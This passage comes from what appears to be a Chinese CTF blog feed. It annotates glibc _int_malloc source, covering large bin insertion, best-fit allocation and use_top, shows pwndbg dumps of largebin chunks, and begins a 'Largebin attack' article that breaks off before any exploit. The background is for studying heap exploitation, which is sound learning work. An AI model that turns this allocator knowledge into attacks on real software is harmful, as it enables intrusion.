0x000000001f2ae850&lt;-fwd 0x000000001f2ae000&lt;-bck</span><br><span class="line">0x7f5cf0f79f88 &lt;main_arena+1128&gt;:       0x00007f5cf0f79f78      0x00007f5cf0f79f78</span><br><span class="line">0x7f5cf0f79f98 &lt;main_arena+1144&gt;:       0x00007f5cf0f79f88      0x00007f5cf0f79f88</span><br><span class="line">0x7f5cf0f79fa8 &lt;main_arena+1160&gt;:       0x00007f5cf0f79f98      0x00007f5cf0f79f98</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">largebins</span><br><span class="line">0x400-0x430: 0x1fa8f000 —▸ 0x1fa8f840 —▸ 0x1fa8f420 —▸ 0x7f9a8e388f68 (main_arena+1096) ◂— 0x1fa8f000</span><br><span class="line">pwndbg&gt; x/10gx 0x1fa8f000</span><br><span class="line">0x1fa8f000:     0x0000000000000000      0x0000000000000401</span><br><span class="line">0x1fa8f010:     0x000000001fa8f840      0x00007f9a8e388f68</span><br><span class="line">0x1fa8f020:     0x000000001fa8f000      0x000000001fa8f000</span><br><span class="line">0x1fa8f030:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0x1fa8f040:     0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x1fa8f840</span><br><span class="line">0x1fa8f840:     0x0000000000000000      0x0000000000000401</span><br><span class="line">0x1fa8f850:     0x000000001fa8f420      0x000000001fa8f000</span><br><span class="line">0x1fa8f860:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0x1fa8f870:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0x1fa8f880:     0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x1fa8f420</span><br><span class="line">0x1fa8f420:     0x0000000000000000      0x0000000000000401</span><br><span class="line">0x1fa8f430:     0x00007f9a8e388f68      0x000000001fa8f840</span><br><span class="line">0x1fa8f440:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0x1fa8f450:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0x1fa8f460:     0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x7f9a8e388f68</span><br><span class="line">0x7f9a8e388f68 &lt;main_arena+1096&gt;:       0x00007f9a8e388f58      0x00007f9a8e388f58</span><br><span class="line">0x7f9a8e388f78 &lt;main_arena+1112&gt;:       0x000000001fa8f000      0x000000001fa8f420</span><br><span class="line">0x7f9a8e388f88 &lt;main_arena+1128&gt;:       0x00007f9a8e388f78      0x00007f9a8e388f78</span><br><span class="line">0x7f9a8e388f98 &lt;main_arena+1144&gt;:       0x00007f9a8e388f88      0x00007f9a8e388f88</span><br><span class="line">0x7f9a8e388fa8 &lt;main_arena+1160&gt;:       0x00007f9a8e388f98      0x00007f9a8e388f98</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>largebin_attack</strong></p>
<p>从上面的内存结构可以看出fwd-&gt;最小的；bck-&gt;最大的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line"><span class="keyword">if</span> (fwd != bck)</span><br><span class="line">  &#123;<span class="comment">//large bin 中有空闲chunk 存在</span></span><br><span class="line">    <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">    size |= PREV_INUSE;</span><br><span class="line">    <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">    assert (chunk_main_arena (bck-&gt;bk));</span><br></pre></td></tr></table></figure>

<p>如果当前chunk比large bin的最后一个chunk的大小还小，那么当前chunk就插入到large bin 的链表的最后，作为最后一个 chunk。可以看出 large bin 中的 chunk 是按照从大到小的 顺序排序的，同时一个 chunk 存在于两个双向循环链表中，一个链表包含了 large bin 中所有 的chunk，另一个链表为chunk size 链表，该链表从每个相同大小的chunk 的取出第一个chunk 按照大小顺序链接在一起，便于一次跨域多个相同大小的 chunk 遍历下一个不同大小的 chunk，这样可以加快在 large bin 链表中的遍历速度。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">          <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">&lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))<span class="comment">//bck-&gt;bk是当前largebin中最小的chunk</span></span><br><span class="line">            &#123;<span class="comment">//直接链入largebin</span></span><br><span class="line">              fwd = bck;</span><br><span class="line">              bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">              victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">              fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure>

<p>正向遍历 <strong>chunk size 链表</strong>，直到找到第一个 chunk 大小小于等于当前 chunk 大小的 chunk 退出循环。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">else</span></span><br><span class="line">               &#123;<span class="comment">//即等于或大于fwd的size</span></span><br><span class="line">                 assert (chunk_main_arena (fwd));</span><br><span class="line">                 <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                   &#123;<span class="comment">//正向遍历largebin</span></span><br><span class="line">                     fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">assert (chunk_main_arena (fwd));</span><br><span class="line">                   &#125;</span><br></pre></td></tr></table></figure>

<p>如果从 large bin 链表中找到了与当前 chunk 大小相同的 chunk，则同一大小的 chunk 已 经存在，那么 chunk size 链表中一定包含了fwd 所指向的 chunk，为了不修改 chunk size 链 表，当前 chunk 只能插入 fwd 之后。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">                 <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size</span><br><span class="line">== (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (fwd))<span class="comment">//直到等于fwd的情况成立</span></span><br><span class="line">                   <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                   fwd = fwd-&gt;fd;<span class="comment">//直接链在fwd后面</span></span><br></pre></td></tr></table></figure>



<p>如果 chunk size 链表中还没有包含当前 chunk 大小的 chunk，也就是说当前 chunk 的大小大于 fwd 的大小，则将当前 chunk 作为该 chunk size 的代表加入 chunk size 链表，chunk size 链表也是按照由大到小的顺序排序。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                   victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                   victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                   <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                     malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted 									  (nextsize)&quot;</span>);</span><br><span class="line">                   fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                   victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                 &#125;</span><br></pre></td></tr></table></figure>

<p>如果 large bin 链表中没有 chunk，直接将当前 chunk加入 chunk size 链表。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">        bck = fwd-&gt;bk;</span><br><span class="line">        <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">          malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>

<p>上面的代码将当前 chunk 插入到 large bin 的空闲 chunk 链表中，并将 large bin 所对应 binmap 的相应 bit 置位。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span></span><br><span class="line"><span class="comment">	 filling the cache, return one of the cached ones.  */</span></span><br><span class="line">      ++tcache_unsorted_count;</span><br><span class="line">      <span class="keyword">if</span> (return_cached</span><br><span class="line">	  &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span></span><br><span class="line">	  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If all the small chunks we found ended up cached, return one now.  */</span></span><br><span class="line">      <span class="keyword">if</span> (return_cached)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>最多遍历unsortedbin 10000次，后面的一部分（在use_top）之前在pwn中可能很少用到，简略分析</p>
<p>当将 unsorted bin 中的空闲 chunk 加入到相应的 small bins 和 large bins 后，将使用<strong>最佳匹配法</strong>分配 large bin chunk。源代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If a large request, scan through the chunks of current bin in</span></span><br><span class="line"><span class="comment">   sorted order to find smallest that fits.  Use the skip list for this.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">  &#123;</span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">    <span class="keyword">if</span> ((victim = first (bin)) != bin</span><br><span class="line"> &amp;&amp; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (victim)</span><br><span class="line">   &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb))</span><br></pre></td></tr></table></figure>

<p>如果所需分配的 chunk为 large bin chunk，查询对应的 large bin 链表，如果 large bin 链 表为空，或者链表中最大的 chunk 也不能满足要求，则不能从 large bin 中分配。否则，遍历 98 large bin 链表，找到合适的 chunk。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  victim = victim-&gt;bk_nextsize;</span><br><span class="line">  <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">          (<span class="type">unsigned</span> <span class="type">long</span>) (nb)))</span><br><span class="line">    victim = victim-&gt;bk_nextsize;</span><br></pre></td></tr></table></figure>

<p>反向遍历chunk size链表(由小到大)，直到找到第一个大于等于所需chunk大小的chunk退出循环。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">          <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">             list does not have to be rerouted.  */</span></span><br><span class="line">          <span class="keyword">if</span> (victim != last (bin)</span><br><span class="line">&amp;&amp; chunksize_nomask (victim)</span><br><span class="line">  == chunksize_nomask (victim-&gt;fd))</span><br><span class="line">            victim = victim-&gt;fd;</span><br></pre></td></tr></table></figure>

<p>如果从 large bin 链表中选取的 chunk victim 不是链表中的最后一个 chunk，并且与 victim 大小相同的chunk 不止一个，那么意味着victim 为chunk size 链表中的节点，为了不调整chunk size 链表，需要避免将 chunk size 链表中的节点取出，所以取 victim-&gt;fd 节点对应的 chunk 作为候选 chunk。由于 large bin 链表中的 chunk 也是按大小排序，同一大小的 chunk 有多个 时，这些 chunk 必定排在一起，所以 victim-&gt;fd 节点对应的 chunk 的大小必定与 victim 的大 小一样。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">remainder_size = size - nb;</span><br><span class="line">unlink_chunk (av, victim);</span><br></pre></td></tr></table></figure>

<p>计算将victim切分后剩余大小，并调用 unlink()宏函数将 victim从 large bin 链表中取出。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">        <span class="comment">/* Exhaust */</span></span><br><span class="line">        <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">          &#123;</span><br><span class="line">            set_inuse_bit_at_offset (victim, size);</span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (victim);</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure>

<p>如果将 victim 切分后剩余大小小于 MINSIZE，则将整个 victim 分配给应用层，这种情况 下，实际分配的 chunk 比所需的 chunk 要大一些。以 64 位系统为例，remainder_size 的可能 大小为 0 和 16，如果为 0，表示victim 的大小刚好等于所需 chunk 的大小，设置 victim 的 inuse 标志，inuse 标志位于下一个相邻的 chunk 的 size 字段中。如果 remainder_size 为 16，则这 16 字节就浪费掉了。如果当前分配区不是主分配区，将 victim 的 size 字段中的非主分配区 标志置位。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">          <span class="comment">/* Split */</span></span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                 have to perform a complete insert here.  */</span></span><br><span class="line">              bck = unsorted_chunks (av);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">              remainder-&gt;bk = bck;</span><br><span class="line">              remainder-&gt;fd = fwd;</span><br><span class="line">              bck-&gt;fd = remainder;</span><br><span class="line">              fwd-&gt;bk = remainder;</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>

<p>从victim 中切分出所需的chunk，剩余部分作为一个新的 chunk 加入到 unsorted bin 中。 如果剩余部分 chunk 属于large bins，将剩余部分 chunk 的 chunk size 链表指针设置为NULL， 因为 unsorted bin 中的 chunk 是不排序的，这两个指针无用，必须清零。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">          set_foot (remainder, remainder_size);</span><br><span class="line">        &#125;</span><br><span class="line">      check_malloced_chunk (av, victim, nb);</span><br><span class="line">      <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从 large bin中使用<strong>最佳匹配法</strong>找到了合适的 chunk，设置victim和remainder的状态，由于 remainder 为空闲 chunk，所以需要设置该 chunk 的 foot；调用 chunk2mem()获得 chunk 中可 用的内存指针，返回给应用层，退出。</p>
<p>如果通过上面的方式从最合适的 small bin 或 large bin 中都<strong>没有分配到需要的chunk</strong>，则 查看比当前 bin 的 index 大的 small bin 或 large bin 是否有空闲 chunk 可利用来分配所需的 chunk。源代码实现如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">         通过扫描bins来搜索chunk，从下一个较大的bin开始。</span></span><br><span class="line"><span class="comment">         这个搜索严格遵循最佳适配原则；即选择适合的最小块（在平局的情况下选择约最少最近使用的块）。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         binmap避免了需要检查大多数块是否为空的情况。</span></span><br><span class="line"><span class="comment">         在热身阶段（即还没有返回任何块的情况下）跳过所有桶的特殊情况比看上去的要快得多。</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      ++idx;  <span class="comment">// 增加索引</span></span><br><span class="line">      bin = bin_at(av, idx);  <span class="comment">// 获取当前索引对应的桶</span></span><br><span class="line">      block = idx2block(idx);  <span class="comment">// 将索引转换为块</span></span><br><span class="line">      <span class="built_in">map</span> = av-&gt;binmap[block];  <span class="comment">// 获取对应块的位图</span></span><br><span class="line">      bit = idx2bit(idx);  <span class="comment">// 将索引转换为位图中的位</span></span><br></pre></td></tr></table></figure>

<p>获取下一个相邻bin 的空闲chunk 链表，并获取该bin 对于binmap 中的bit 位的值。Binmap 中的标识了相应的 bin 中是否有空闲 chunk 存在。Binmap 按 block 管理，每个 block 为一个 int，共 32 个 bit，可以表示 32 个 bin 中是否有空闲 chunk 存在。使用 binmap 可以加快查找 bin 是否包含空闲 chunk。这里只查询比所需 chunk 大的 bin 中是否有空闲 chunk 可用。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">    <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">              <span class="keyword">goto</span> use_top;</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">        bit = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>Idx2bit()宏将 idx 指定的位设置为 1，其它位清零，map 表示一个 block（unsigned int） 值，如果 bit 大于 map，意味着 map 为 0，该 block 所对应的所有 bins 中都没有空闲 chunk， 于是遍历 binmap 的下一个 block，直到找到一个不为 0 的 block 或者遍历完所有的 block。 退出循环遍历后，设置 bin 指向 block 的第一个 bit 对应的 bin，并将 bit 置为 1，表示该 block 中 bit 1 对应的 bin，这个 bin 中如果有空闲 chunk，该 chunk 的大小一定满足要求。</p>
<p>….过了</p>
<p>如果从所有的 bins 中都没有获得所需的 chunk，可能的情况为 bins 中没有空闲 chunk， 或者所需的 chunk 大小很大，下一步将尝试从 top chunk 中分配所需 chunk。源代码实现如 下：</p>
<h3 id="use-top"><a href="#use-top" class="headerlink" title="use_top"></a>use_top</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">use_top:</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">     (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">     search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">     less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">     be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">     limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">     MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">     exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">     reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">     to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  victim = av-&gt;top;</span><br><span class="line">  size = chunksize (victim);</span><br></pre></td></tr></table></figure>

<p>将当前分配区的top chunk赋值给 victim，并获得 victim 的大小。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">  &#123;<span class="comment">//topchunk够用</span></span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset (victim, nb);</span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>由于 top chunk 切分出所需 chunk 后，还需要 MINSIZE 的空间来作为fencepost，所需必须满足 top chunk 的大小大于所需 chunk 的大小加上 MINSIZE 这个条件，才能从 top chunk 中分配所需 chunk。从 top chunk 切分出所需 chunk 的处理过程跟前面的 chunk 切分类似， 不同的是，原 top chunk 切分后的剩余部分将作为新的 top chunk，原 top chunk 的 fencepost 仍然作为新的top chunk 的 fencepost，所以切分之后剩余的 chunk 不用 set_foot。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">   here for all block sizes.  */</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">  &#123;</span><br><span class="line">    malloc_consolidate (av);</span><br><span class="line">    <span class="comment">/* restore original bin index */</span></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>如果 top chunk 也不能满足要求，<strong>查看 fast bins 中是否有空闲 chunk 存在</strong>，由于开启了 ATOMIC_FASTBINS 优化情况下，free 属于 fast bins 的 chunk 时不需要获得分配区的锁，所以在调用_int_malloc()函数时，有可能有其它线程已经向 fast bins 中加入了新的空闲 chunk，也有可能是所需的 chunk 属于 small bins，但通过前面的步骤都没有分配到所需的 chunk，由于 分配 small bin chunk 时在前面的步骤都不会调用 malloc_consolidate()函数将 fast bins 中的 chunk 合并加入到 unsorted bin 中。所在这里如果 fast bin 中有 chunk 存在， 调用 malloc_consolidate()函数，并重新设置当前 bin 的 index。并转到最外层的循环，尝试重新分 配 small bin chunk 或是 large bin chunk。如果开启了 ATOMIC_FASTBINS 优化，有可能在由其 它线程加入到fast bins 中的 chunk 被合并后加入 unsorted bin 中，从 unsorted bin 中就可以 分配出所需的 large bin chunk 了，所以对没有成功分配的 large bin chunk 也需要重试。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>山穷水尽了，只能想系统申请内存了。sysmalloc()函数可能分配的 chunk 包括 small bin chunk，large bin chunk 和 large chunk。</p>
<p>至此，_int_malloc()函数的代码就罗列完了，当还有两个关键函数没有分析，一个为 malloc_consolidate()，另一个为 sysmalloc()。</p>
<h2 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate()"></a>malloc_consolidate()</h2>]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>/lib/ld-linux-armhf.so.3: No such file or directory</title>
    <url>/2025/07/15/libld-linux-armhf.so.3%20No%20such%20file%20or%20directory%E8%A7%A3%E5%86%B3/</url>
    <content><![CDATA[<h1 id="ubuntu-执行-arm-程序显示：-lib-ld-linux-armhf-so-3-No-such-file-or-directory"><a href="#ubuntu-执行-arm-程序显示：-lib-ld-linux-armhf-so-3-No-such-file-or-directory" class="headerlink" title="ubuntu 执行 arm 程序显示：&#x2F;lib&#x2F;ld-linux-armhf.so.3: No such file or directory"></a>ubuntu 执行 arm 程序显示：&#x2F;lib&#x2F;ld-linux-armhf.so.3: No such file or directory</h1><ol>
<li>运行arm文件xxx，报错 <strong>&#x2F;lib&#x2F;ld-linux-armhf.so.3: No such file or directory</strong></li>
<li>安装 libc6-armhf-cross，<code>sudo apt-get install libc6-armhf-cross</code>, 成功后会有目录 <code>/usr/arm-linux-gnueabihf</code> 文件夹</li>
<li>安装 qemu，<code>sudo apt install qemu</code>（可忽略）</li>
<li>指定 lib 环境运行，qemu-arm -L &#x2F;usr&#x2F;arm-linux-gnueabihf&#x2F; .&#x2F;xxx</li>
</ol>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>arm</tag>
      </tags>
  </entry>
  <entry>
    <title>Largebin attack</title>
    <url>/2025/03/26/largebin_attack/</url>
    <content><![CDATA[<p>文章是在初次学习largebin_attack时写的，有不准确的地方还望指正，文章中所用的环境基本都是ubuntu16.04</p>
<h2 id="了解largebin"><a href="#了解largebin" class="headerlink" title="了解largebin"></a>了解largebin</h2><p>了解largebin，首先要了解largebin的结构，下面是glibc源码的一部分：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  -----------------------  Chunk representations -----------------------</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>可以看出来，largebin中的chunk比其他的bins中的就够多出来了一部分就是<code>fd_nextsize</code>和<code>bk_nextsize</code></p>
<p><strong>什么样的大小才属于largebin？</strong></p>
